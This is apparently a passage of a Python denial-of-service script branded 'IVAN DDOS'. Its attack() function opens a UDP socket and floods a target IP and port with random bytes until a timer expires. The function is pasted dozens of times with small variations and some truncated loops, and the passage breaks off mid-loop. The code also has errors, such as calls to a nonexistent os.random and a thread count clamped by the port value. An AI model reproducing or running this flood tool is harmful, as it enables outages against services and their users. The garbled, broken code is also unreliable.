        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
